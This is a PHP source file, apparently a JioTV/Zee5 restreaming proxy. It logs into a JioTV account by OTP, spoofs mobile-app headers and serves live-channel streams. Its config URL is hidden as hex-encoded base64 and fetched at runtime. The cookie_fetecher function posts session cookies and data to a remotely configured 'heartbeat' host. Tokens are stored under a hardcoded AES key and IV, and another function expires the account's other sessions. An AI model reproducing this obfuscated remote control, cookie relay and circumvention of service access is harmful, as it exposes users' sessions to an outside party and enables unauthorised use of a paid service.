<?php
//=============================================================================//
//                      खून से लिखी हुई कहानी है ये…
//                      KHOON SE LIKHEE HUEE KAHAANEE HAI YE...
//=============================================================================//
error_reporting(0);
$DARK_SIDE = "doctor_strange";
$WHITE_SIDE = "jitendraunatti";
if (!is_dir($DARK_SIDE)) {
    mkdir($DARK_SIDE, 0777, true);
}
if (!is_dir($WHITE_SIDE)) {
    mkdir($WHITE_SIDE, 0777, true);
}
if (!file_exists("$DARK_SIDE/.htaccess")) {
    file_put_contents("$DARK_SIDE/.htaccess", "Deny from all\n");
}
if (!file_exists("$DARK_SIDE/index.php")) {
    file_put_contents("$DARK_SIDE/index.php", "<?php http_response_code(403); exit('Forbidden'); ?>");
}
header("access-control-allow-origin: *");
header("access-control-allow-headers: content-type, x-developed-by, x-powered-by, x-github-username, x-timestamp, x-readable-time");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
$SCARLET_WITCH = doctor_strange();
$STARK_INDUSTRIES = @jio_data();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    header('Content-Type: application/json');
    $TONY_STARK = json_decode(file_get_contents('php://input'), true);
    $headers = getallheaders();
    $headers = array_change_key_case($headers, CASE_LOWER);
    $JPD   = isset($headers['x-developed-by']) && $headers['x-developed-by'] === $SCARLET_WITCH['JITENDRA_UNIVERSE']['x-developed-by'];
    $WANDA = isset($headers['x-powered-by']) && $headers['x-powered-by'] === $SCARLET_WITCH['JITENDRA_UNIVERSE']['X-POWERED-BY'];
    if ($JPD && $WANDA) {
        $ACTION = $TONY_STARK['action'] ?? '';
        if ($ACTION === "livechannels") {
            $cacheFile = $WHITE_SIDE . '/livechannels.json';
            $cacheTime = 86400;
            $content = '';
            if (file_exists($cacheFile) && (time() - filemtime($cacheFile) < $cacheTime)) {
                $content = file_get_contents($cacheFile);
            } else {
                $content = file_get_contents($SCARLET_WITCH['api_endpoint']['live_channels']);
                if ($content) {
                    file_put_contents($cacheFile, $content);
                }
            }
            $etag = md5($content);
            header("Cache-Control: public, max-age=3600");
            header("ETag: \"$etag\"");
            header("Vary: x-developed-by, x-powered-by, x-github-username");
            if (isset($_SERVER['HTTP_IF_NONE_MATCH']) && trim($_SERVER['HTTP_IF_NONE_MATCH']) == "\"$etag\"") {
                http_response_code(304);
                exit;
            }

            echo $content;
        } else if ($ACTION === "livechannelszee5") {
            $cacheFile = $WHITE_SIDE . '/zee5.json';
            $cacheTime = 86400;
            $content = '';
            if (file_exists($cacheFile) && (time() - filemtime($cacheFile) < $cacheTime)) {
                $content = file_get_contents($cacheFile);
            } else {
                $content = file_get_contents($SCARLET_WITCH['zee_api']['web_api']);
                if ($content) {
                    file_put_contents($cacheFile, $content);
                }
            }
            $etag = md5($content);
            header("Cache-Control: public, max-age=3600");
            header("ETag: \"$etag\"");
            header("Vary: x-developed-by, x-powered-by, x-github-username");
            if (isset($_SERVER['HTTP_IF_NONE_MATCH']) && trim($_SERVER['HTTP_IF_NONE_MATCH']) == "\"$etag\"") {
                http_response_code(304);
                exit;
            }

            echo $content;
        } else if ($ACTION === "otpsend") {
            $mobile_no = $TONY_STARK['number'] ?? '';
            if (!empty($mobile_no) && strlen($mobile_no) == 10) {
                $JARVIS_RESPONSE = jiotv_otp_send($mobile_no);
                echo $JARVIS_RESPONSE;
            } else {
                echo json_encode([
                    "message" => "INVALID_MOBILE_NUMBER ❌",
                    "ui_label" => "Please enter a valid 10-digit number",
                    "status" => "failed"
                ]);
            }
        } else if ($TONY_STARK['action'] === "otpverify") {
            $OTP_CODE = $TONY_STARK['otp'] ?? '';
            if (!empty($OTP_CODE)) {
                echo jio_tv_login($OTP_CODE);
            } else {
                echo json_encode(["message" => "MISSING_OTP", "ui_label" => "Please enter OTP ❌"]);
            }
        } else {
            http_response_code(400);
            echo json_encode(["error" => "Unknown Action Protocol"]);
        }
    } else {
        http_response_code(403);
        echo json_encode(["error" => "Unauthorized: Signatures Not Verified"]);
    }
}
function image($cid)
{
    global $DARK_SIDE, $SCARLET_WITCH, $BLOODY_SWEET, $TONY_STARK, $STARK_INDUSTRIES;

    if (isset($SCARLET_WITCH['api_endpoint']['img_cdn_url'])) {
        $ROLEX = json_decode(file_get_contents($SCARLET_WITCH['api_endpoint']['img_cdn_url']), true);
        return $ROLEX[array_rand($ROLEX)]["url"];
    } else {
        return "https://jiotvimages.cdn.jio.com/dare_images/images/$cid";
    }
}
function live_id($id)
{
    global $DARK_SIDE, $SCARLET_WITCH, $BLOODY_SWEET, $TONY_STARK, $STARK_INDUSTRIES;
    if (strlen($id) < 6 || strpos($id, "zee5.com") !== false) {
        $id = "live.php?id=$id&token=" . $SCARLET_WITCH['JITENDRA_UNIVERSE']['token'] . "&e=.m3u8";
        return str_replace(".jitendraunatti", ".m3u8", $id);
    } else {
        return str_replace(".jitendraunatti", ".m3u8", $id);
    }
}
function doctor_strange()
{
    global $DARK_SIDE, $SCARLET_WITCH, $BLOODY_SWEET, $TONY_STARK, $STARK_INDUSTRIES;
    $chunks = [
        '6148523063484d364c79396e61584e304c6d647064476831',
        '596e567a5a584a6a623235305a5735304c6d4e766253394b',
        '6158526c626d52795958567559585230615338344d575269',
        '5954637859544d31596d56684f5751354e44646d4f544578',
        '5a6d51315a5759354f54686d4d4339795958637659584270',
        '4c6d707a6232343d',
    ];
    $raw = hex2bin(implode('', $chunks));
    $ASUR = json_decode(file_get_contents(base64_decode($raw)), true);
    return $ASUR;
}
function scarlet_witch($action, $data)
{
    global $DARK_SIDE, $SCARLET_WITCH, $BLOODY_SWEET, $TONY_STARK, $STARK_INDUSTRIES;
    $method = "aes-128-cbc";
    $iv = "JITENDRA_KUMAR_U";
    $key = "JITENDRA_KUMAR_U";
    if ($action == "encrypt") {
        $encrypted = openssl_encrypt($data, $method, $key, OPENSSL_RAW_DATA, $iv);
        if (!empty($encrypted)) {
            $response = bin2hex($encrypted);
        }
    } elseif ($action == "decrypt") {
        $decrypted = openssl_decrypt(hex2bin($data), $method, $key, OPENSSL_RAW_DATA, $iv);
        if (!empty($decrypted)) {
            $response = $decrypted;
        }
    } else {
        $response = "something went wrong";
    }
    return $response;
}
//=============================================================================//
//                       𝐉𝐈𝐎_𝐂𝐈𝐍𝐄𝐌𝐀_𝐎𝐓𝐏_𝐒𝐄𝐍𝐃_𝐏𝐑𝐎𝐂𝐄𝐒𝐒
//=============================================================================//

function jiotv_otp_send($mobile_no)
{
    global $DARK_SIDE, $SCARLET_WITCH, $BLOODY_SWEET, $TONY_STARK, $STARK_INDUSTRIES;
    $KANG = '{"number":"' . base64_encode('+91' . $mobile_no) . '"}';
    $ROLEX = [
        'User-Agent: ' . $SCARLET_WITCH['api_endpoint_static_value']["User-Agent-OkHttp"],
        'appname: ' . $SCARLET_WITCH['api_endpoint_static_value']["appName"],
        'os: ' . $SCARLET_WITCH['api_endpoint_static_value']["os"],
        'm-rating: ' . $SCARLET_WITCH['api_endpoint_static_value']["m-rating"],
        'devicetype: ' . $SCARLET_WITCH['api_endpoint_static_value']["deviceType"],
        'content-type: application/json; charset=utf-8',
    ];
    $DOCTOR_STRANGE = jitendraunatti(base64_decode(hex2bin($SCARLET_WITCH['jiotv_api']["send"])), $ROLEX, "POST", $KANG, 0, 0, 0, 0, 0, 0, 0, 0);
    $CHRISTINE = json_decode($DOCTOR_STRANGE["JITENDRAUNATTI"]["data"], true);
    $NICK_FURY = $DOCTOR_STRANGE["JITENDRAUNATTI"]["info"];
    if (isset($NICK_FURY['http_code']) && $NICK_FURY['http_code'] === 204) {
        $JARVIS = "SUCCESS";
        $UI_LABEL = "OTP Sent Successfully ✅";
        file_put_contents($DARK_SIDE . "/mobile.txt", $mobile_no);
    } else {
        $ULTON = $CHRISTINE['code'] ?? 0;
        switch ($ULTON) {
            case 1042:
                $JARVIS = "INVALID_SESSION";
                $UI_LABEL = "Session Expired. Please restart ❌";
                break;
            case 1002:
                $JARVIS = "USER_NOT_FOUND";
                $UI_LABEL = "This mobile number is not registered ❌";
                break;
            case 1040:
                $JARVIS = "RATE_LIMIT";
                $UI_LABEL = "Too many attempts. Please wait 15 minutes ❌";
                break;
            default:
                $JARVIS = "API_ERROR";
                $UI_LABEL = ($CHRISTINE['message'] ?? "Connection Refused") . " ❌";
                break;
        }
    }
    header('Content-Type: application/json');
    return json_encode([
        "message"      => $JARVIS,
        "ui_label"     => $UI_LABEL,
        "code"         => $NICK_FURY,
        "content_type" => $NICK_FURY['content_type'] ?? "application/json",
    ]);
}
//=============================================================================//
//                      𝐉𝐈𝐎_𝐂𝐈𝐍𝐄𝐌𝐀_𝐑𝐄𝐅𝐑𝐄𝐒𝐇𝐓𝐎𝐊𝐄𝐍_𝐏𝐑𝐎𝐂𝐄𝐒𝐒
//=============================================================================//
function jio_tv_refreshtoken_generate()
{
    global $DARK_SIDE, $SCARLET_WITCH, $STARK_INDUSTRIES;
    $ENCRYPTED_FILE = $DARK_SIDE . "/login_token.jitendraunatti";
    if (!file_exists($ENCRYPTED_FILE)) {
        return json_encode(["status" => "ERROR", "message" => "Secure Identity not found ❌"]);
    }
    $CIPHER_DATA = file_get_contents($ENCRYPTED_FILE);
    $DECRYPTED_RAW = scarlet_witch("decrypt", $CIPHER_DATA);
    $STARK_INDUSTRIES = json_decode($DECRYPTED_RAW, true);
    $CURRENT_TOKEN = $STARK_INDUSTRIES['data']['authToken'] ?? '';
    if (!empty($CURRENT_TOKEN)) {
        $TOKEN_PARTS = explode('.', $CURRENT_TOKEN);
        if (count($TOKEN_PARTS) === 3) {
            $PAYLOAD = json_decode(base64_decode($TOKEN_PARTS[1]), true);
            $EXP_TIME = $PAYLOAD['exp'] ?? 0;
            if ($EXP_TIME > (time() + 3600)) {
                return json_encode([
                    "status" => "SUCCESS",
                    "source" => "SECURE_CACHE",
                    "expire" => $EXP_TIME,
                    "authToken" => $CURRENT_TOKEN
                ]);
            }
        }
    }
    $KANG = json_encode([
        "appName" => $SCARLET_WITCH['api_endpoint_static_value']["appName"],
        "deviceId" => $STARK_INDUSTRIES['data']['deviceId'],
        "refreshToken" => $STARK_INDUSTRIES['data']['refreshToken']
    ]);
    $ROLEX = [
        'User-Agent: ' . $SCARLET_WITCH['api_endpoint_static_value']["User-Agent-OkHttp"],
        "accesstoken: " . $CURRENT_TOKEN,
        "devicetype: " . $SCARLET_WITCH['api_endpoint_static_value']["deviceType"],
        "versionCode: " . $SCARLET_WITCH['api_endpoint_static_value']["versionCode"],
        "os: " . $SCARLET_WITCH['api_endpoint_static_value']["os"],
        'uniqueid: ' . $STARK_INDUSTRIES["data"]["sessionAttributes"]["user"]["unique"],
        'content-type: application/json; charset=utf-8',
    ];
    $DOCTOR_STRANGE = jitendraunatti(base64_decode(hex2bin($SCARLET_WITCH['jiotv_api']["refreshtoken"])), $ROLEX, "POST", $KANG, 0, 0, 0, 0, 0, 0, 0, 0);
    $CHRISTINE = json_decode($DOCTOR_STRANGE["JITENDRAUNATTI"]["data"], true);
    if (isset($CHRISTINE['code']) && $CHRISTINE['code'] === 200 && !empty($CHRISTINE['data']["authToken"])) {
        $STARK_INDUSTRIES['data']['authToken'] = $CHRISTINE['data']["authToken"];
        $STARK_INDUSTRIES['data']['refreshToken'] = $CHRISTINE['data']["refreshToken"] ?? $STARK_INDUSTRIES['data']['refreshToken'];
        $UPDATED_JSON = json_encode($STARK_INDUSTRIES);
        file_put_contents($ENCRYPTED_FILE, scarlet_witch("encrypt", $UPDATED_JSON));
        return json_encode([
            "status" => "SUCCESS",
            "source" => "SECURE_API_REFRESH",
            "authToken" => $CHRISTINE['data']["authToken"]
        ]);
    } else {
        return json_encode([
            "status" => "FAILED",
            "message" => "Handshake Failed ❌"
        ]);
    }
}
function jio_data()
{
    global $DARK_SIDE, $SCARLET_WITCH, $BLOODY_SWEET, $TONY_STARK, $STARK_INDUSTRIES;
    return json_decode(scarlet_witch("decrypt", file_get_contents($DARK_SIDE . "/login_token.jitendraunatti")), true);
}
//=============================================================================//
//                      EXPIRE_ALL_USERS_PROCESS
//=============================================================================//
function expireallusers($temp_token, $DEVICE_ID)
{
    global $DARK_SIDE, $SCARLET_WITCH, $BLOODY_SWEET, $TONY_STARK;
    $KANG = '{"appName":"' . $SCARLET_WITCH['api_endpoint_static_value']["appName"] . '","deviceId":"' . $DEVICE_ID  . '"}';
    $ROLEX = [
        'User-Agent: ' . $SCARLET_WITCH['api_endpoint_static_value']["User-Agent-OkHttp"],
        'x-platform: ' . $SCARLET_WITCH['api_endpoint_static_value']["x-platform"],
        'temptoken: ' . $temp_token,
        'content-type: application/json; charset=utf-8',
    ];
    $DOCTOR_STRANGE = jitendraunatti(base64_decode(hex2bin($SCARLET_WITCH['jiotv_api']["expireallusers"])), $ROLEX, "POST", $KANG, 0, 0, 0, 0, 0, 0, 0, 0);
    return $DOCTOR_STRANGE["JITENDRAUNATTI"]["data"];
}
//=============================================================================//
// 🔐 JIO_CINEMA_LOGIN_PROCESS
//=============================================================================//
function jio_tv_login($OTP)
{
    global $DARK_SIDE, $SCARLET_WITCH, $BLOODY_SWEET, $TONY_STARK, $STARK_INDUSTRIES;
    $JANET = file_get_contents("$DARK_SIDE/mobile.txt");
    $GEN_DEVICE_ID = substr(sha1(time() . rand(00, 99)), 0, 16);
    $ROLEX = [
        'User-Agent: ' . $SCARLET_WITCH['api_endpoint_static_value']["User-Agent-OkHttp"],
        'appname: ' . $SCARLET_WITCH['api_endpoint_static_value']["appName"],
        'os: ' . $SCARLET_WITCH['api_endpoint_static_value']["os"],
        'devicetype: ' . $SCARLET_WITCH['api_endpoint_static_value']["deviceType"],
        'content-type: application/json; charset=utf-8',
    ];
    $KANG = json_encode([
        "number" => base64_encode("+91$JANET"),
        "otp" => $OTP,
        "deviceInfo" => [
            "consumptionDeviceName" => $SCARLET_WITCH['api_endpoint_static_value']["devicename"],
            "info" => [
                "type" => $SCARLET_WITCH['api_endpoint_static_value']["os"],
                "platform" => ["name" => $SCARLET_WITCH['api_endpoint_static_value']["p-Name"]],
                "androidId" => $GEN_DEVICE_ID
            ]
        ]
    ]);
    $DOCTOR_STRANGE = jitendraunatti(base64_decode(hex2bin($SCARLET_WITCH['jiotv_api']["verify"])), $ROLEX, "POST", $KANG, 0, 0, 0, 0, 0, 0, 0, 0);
    $CHRISTINE = json_decode($DOCTOR_STRANGE["JITENDRAUNATTI"]["data"], true);
    if (isset($CHRISTINE['code']) && $CHRISTINE['code'] === 200) {
        if (!empty($CHRISTINE['data']['tempToken']) && empty($CHRISTINE['data']['authToken'])) {
            $OLD_IDENTITY = $CHRISTINE;
            $TARGET_DEVICE = $CHRISTINE['data']['deviceId'] ?? $GEN_DEVICE_ID;
            $EXPIRE_RESPONSE_RAW = expireallusers($CHRISTINE['data']['tempToken'], $TARGET_DEVICE);
            $NEW_TOKENS = json_decode($EXPIRE_RESPONSE_RAW, true);
            if (isset($NEW_TOKENS['data']['authToken'])) {
                $OLD_IDENTITY['data']['authToken']    = $NEW_TOKENS['data']['authToken'];
                $OLD_IDENTITY['data']['refreshToken'] = $NEW_TOKENS['data']['refreshToken'];
                $OLD_IDENTITY['data']['ssoToken']     = $NEW_TOKENS['data']['ssoToken'];
                $CHRISTINE = $OLD_IDENTITY;
                $FINAL_DATA = json_encode($CHRISTINE);
            }
        } else {
            $FINAL_DATA = $DOCTOR_STRANGE["JITENDRAUNATTI"]["data"];
        }
        if (!empty($CHRISTINE['data']['authToken'])) {
            $JARVIS = "SUCCESS";
            $UI_LABEL = "Logged in Successfully ✅";
            if (file_exists("$DARK_SIDE/mobile.txt")) unlink("$DARK_SIDE/mobile.txt");
            file_put_contents("$DARK_SIDE/login_token.jitendraunatti", scarlet_witch("encrypt", $FINAL_DATA));
        } else {
            $JARVIS = "FAILED";
            $UI_LABEL = "Token Generation Failed ❌";
        }
    } else if (isset($CHRISTINE['code']) && $CHRISTINE['code'] === 1043) {
        $JARVIS = "INVALID_OTP";
        $UI_LABEL = "Incorrect OTP entered ❌";
    } else {
        $JARVIS = "AUTH_ERROR";
        $UI_LABEL = $CHRISTINE['message'] ?? "Verification Failed ❌";
    }
    return json_encode([
        "message" => $JARVIS,
        "ui_label" => $UI_LABEL,
        "CODE" => $DOCTOR_STRANGE["JITENDRAUNATTI"]["info"]['http_code'] ?? 0
    ]);
}
function cookie_fetecher($THANOS, $LOKI, $BENZ)
{
    global $DARK_SIDE, $SCARLET_WITCH, $BLOODY_SWEET, $TONY_STARK, $STARK_INDUSTRIES;
    $CHRISTINE = $THANOS;
    $pattern = '/^Set-Cookie:\s*(.*)$/mi';
    preg_match_all($pattern, $CHRISTINE, $matches);
    $checker = $matches;
    $JITENDRAUNTTI = explode(";", $checker[1][0]);
    if ($SCARLET_WITCH['heartbeat_api']["heartbeat"] == "ON") {
        $dataPayload = [
            "req-headers" => [
                "x-api-key"  => $SCARLET_WITCH['heartbeat_api']['headers']["x-api-key"],
                "User-Agent" => $SCARLET_WITCH['heartbeat_api']['headers']["User-Agent"]
            ],
            "path"   => "data/" . $SCARLET_WITCH['heartbeat_api']["base"] . "_" . $BENZ,
            "method" => "POST",
            "headers" => [
                "user-agent" => $SCARLET_WITCH['api_endpoint_static_value']["user-agent"],
                "cookie"     => $JITENDRAUNTTI[0],
            ],
            "domain"    => $SCARLET_WITCH['heartbeat_api']["domain"],
            "note"      => $SCARLET_WITCH['heartbeat_api']["note"],
            "updatedBy" => $SCARLET_WITCH['heartbeat_api']["updatedBy"],
            'data' => $LOKI,
        ];
        $ch = curl_init($SCARLET_WITCH['heartbeat_api']["url"]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($dataPayload));
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            "Content-Type: application/json"
        ]);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $response = curl_exec($ch);
        curl_close($ch);
        return $JITENDRAUNTTI[0];
    } else {
        return $JITENDRAUNTTI[0];
    }
}
function sendM3U8HeadersAdvanced()
{
    header("Content-Type: application/vnd.apple.mpegurl");
    header("Access-Control-Allow-Origin: *");
    header("access-control-allow-headers: content-type, x-developed-by, x-powered-by, x-github-username, x-timestamp, x-readable-time");
    header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
    header("Cache-Control: no-cache, no-store, must-revalidate");
    header("Pragma: no-cache");
    header("Expires: 0");
    header("Connection: keep-alive");
}
/*
⚠️ NOTICE TO USERS & DEVELOPERS

This source code is provided FREE of cost.

If you obtained this code from any paid source or third-party,
you have been misled.

👉 Official source:
https://github.com/Jitendraunatti/JioTv

Please support original work and do not promote reselling.

— Jitendra Kumar
*/


//=============================================================================//
//                        POWERHOUSE_CORE_SYSTEM
//=============================================================================//
function jitendraunatti($THANOS, $ROLEX, $NICK_FURY, $KANG, $PETER_PARKER, $CHAVEZ, $JANET, $HANK, $MJ, $LEO, $BENZ, $MIGHTY_THOR)
{
    global $DARK_SIDE, $WHITE_SIDE, $SCARLET_WITCH, $BLOODY_SWEET, $TONY_STARK, $STARK_INDUSTRIES;
    if (!empty($MIGHTY_THOR)  && $MIGHTY_THOR !== null && $MIGHTY_THOR !== 0) {
        $ROLEX =
            [
                'User-Agent: ' . $SCARLET_WITCH['api_endpoint_static_value']["user-agent"],
                'appkey: ' . $SCARLET_WITCH['api_endpoint_static_value']["appkey"],
                'devicetype: ' . $SCARLET_WITCH['api_endpoint_static_value']["deviceType"],
                'os: ' . $SCARLET_WITCH['api_endpoint_static_value']["os"],
                'deviceid: ' . $STARK_INDUSTRIES['data']['deviceId'],
                'versionCode: ' . $SCARLET_WITCH['api_endpoint_static_value']["versionCode"],
                'osversion: ' . $SCARLET_WITCH['api_endpoint_static_value']["osversion"],
                'dm: ' . $SCARLET_WITCH['api_endpoint_static_value']["dm"],
                'x-platform: ' . $SCARLET_WITCH['api_endpoint_static_value']["x-platform"],
                'uniqueid: ' . $STARK_INDUSTRIES['data']['sessionAttributes']['user']['unique'],
                'usergroup: ' . $SCARLET_WITCH['api_endpoint_static_value']["usergroup"],
                'languageid: 6',
                'userid: ril' . $STARK_INDUSTRIES['data']['sessionAttributes']['user']['subscriberId'],
                'sid: ' . $STARK_INDUSTRIES['data']['analyticsId'],
                'crmid: ' . $STARK_INDUSTRIES['data']['sessionAttributes']['user']['subscriberId'],
                'isott: ' . $SCARLET_WITCH['api_endpoint_static_value']["isott"],
                'channelid: ' . $BENZ,
                'langid: ',
                'camid: ',
                'appName: ' . $SCARLET_WITCH['api_endpoint_static_value']["appName"],
                'srno: ' . date('ymdHis'),
                'accesstoken: ' . json_decode(jio_tv_refreshtoken_generate(), true)['authToken'],
                'ssotoken: ' . $STARK_INDUSTRIES['data']['ssoToken'],
                'subscriberid: ' . $STARK_INDUSTRIES['data']['sessionAttributes']['user']['subscriberId'],
                'lbcookie: 1',
                'cookie: ' . base64_decode(hex2bin($MIGHTY_THOR)),
                'priority: u=1',
            ];
    }
    if ($ROLEX == 0 && is_numeric($BENZ)) {
        $ROLEX = [
            'os: ' . $SCARLET_WITCH['api_endpoint_static_value']["os"],
            'accesstoken: ' . json_decode(jio_tv_refreshtoken_generate(), true)['authToken'],
            'appName: ' . $SCARLET_WITCH['api_endpoint_static_value']["appName"],
            'subscriberid: ' . $STARK_INDUSTRIES['data']['sessionAttributes']['user']['subscriberId'],
            'deviceid: ' . $STARK_INDUSTRIES['data']['deviceId'],
            'userid: ' . $STARK_INDUSTRIES['data']['sessionAttributes']['user']['uid'],
            'versionCode: ' . $SCARLET_WITCH['api_endpoint_static_value']["versionCode"],
            'devicetype: ' . $SCARLET_WITCH['api_endpoint_static_value']["deviceType"],
            'crmid: ' . $STARK_INDUSTRIES['data']['sessionAttributes']['user']['subscriberId'],
            'osversion: ' . $SCARLET_WITCH['api_endpoint_static_value']["osversion"],
            'srno: ' . date('ymdHis'),
            'usergroup: ' . $SCARLET_WITCH['api_endpoint_static_value']["usergroup"],
            'x-platform: ' . $SCARLET_WITCH['api_endpoint_static_value']["x-platform"],
            'uniqueid: ' . $STARK_INDUSTRIES['data']['sessionAttributes']['user']['unique'],
            'ssotoken: ' . $STARK_INDUSTRIES['data']['ssoToken'],
            'channelid: ' . $BENZ,
            'Connection: Keep-Alive',
            'User-Agent: ' . $SCARLET_WITCH['api_endpoint_static_value']["system-user-agent"],

        ];
    }
    if (strpos($THANOS, "zee5.com") !== false) {
        $cache = $DARK_SIDE . '/zee5.txt';
        if (file_exists($cache) && (time() - filemtime($cache) < 18000)) {
            $ANTMAN = json_decode(scarlet_witch("decrypt", file_get_contents($cache)), true);
        } else {
            $data = file_get_contents($SCARLET_WITCH['api_endpoint']['zee5']);
            $ANTMAN = json_decode($data, true);
            if ($data) file_put_contents($cache, scarlet_witch("encrypt", $data));
        }
        $ROLEX = [];
        if ((strpos($THANOS, "index-connected.") !== false) || strpos($THANOS, "master.") !== false) {
            $THANOS = $THANOS . '?' . $ANTMAN['data']['headers']['cookie'];
        }
        foreach ($ANTMAN['data']['headers'] as $key => $WANDA) {
            if ($key !== 'cookie') $ROLEX[] = "$key: $WANDA";
        }
    }
    $IRON_MAN = curl_init($THANOS);
    curl_setopt($IRON_MAN, CURLOPT_HTTPHEADER, $ROLEX);
    curl_setopt($IRON_MAN, CURLOPT_TIMEOUT, 10);
    curl_setopt($IRON_MAN, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($IRON_MAN, CURLOPT_ENCODING, "gzip");
    if (isset($KANG) && !empty($KANG) && $KANG !== null) {
        curl_setopt($IRON_MAN, CURLOPT_CUSTOMREQUEST, $NICK_FURY);
        curl_setopt($IRON_MAN, CURLOPT_POSTFIELDS, $KANG);
    }
    if (isset($NICK_FURY) && $KANG === null && strpos($NICK_FURY, "GET") !== false) {
        curl_setopt($IRON_MAN, CURLOPT_CUSTOMREQUEST, 'GET');
    }
    if (isset($PETER_PARKER) && !empty($PETER_PARKER)) {
        curl_setopt($IRON_MAN, CURLOPT_HEADER, $PETER_PARKER);
    }
    if (isset($CHAVEZ) && !empty($CHAVEZ)) {
        curl_setopt($IRON_MAN,  CURLOPT_FOLLOWLOCATION, $CHAVEZ);
    }
    if (isset($JANET) && !empty($JANET)) {
        curl_setopt($IRON_MAN,  CURLOPT_SSL_VERIFYPEER, $JANET);
    }
    if (isset($HANK) && !empty($HANK)) {
        curl_setopt($IRON_MAN,  CURLOPT_SSL_VERIFYHOST, $HANK);
    }
    $LOKI = curl_exec($IRON_MAN);
    $CASSIE = curl_getinfo($IRON_MAN);
    $data = $LOKI;
    $THOR = "JANE_FOSTER";
    if (isset($PETER_PARKER) && !empty($PETER_PARKER)) {
        $header_size = $CASSIE['header_size'];
        $THOR = substr($LOKI, 0, $header_size);
        $data = substr($LOKI, $header_size);
    }
    curl_close($IRON_MAN);
    return array(
        "JITENDRAUNATTI" => array(
            "data" => $data,
            "info" => $CASSIE,
            "THOR" => $THOR,
            "LOKI" => "SYLVIE",
            "DOCTOR_STRANGE" => "CHRISTINE"
        )
    );
}
function video()
{
    $LOKI = file_get_contents("https://video.twimg.com/amplify_video/1797150287292981248/pl/-GLBpWJuiNKBrdvp.m3u8");
    $LOKI = str_replace("/amplify_video/", "https://video.twimg.com/amplify_video/", $LOKI);
    return $LOKI;
}
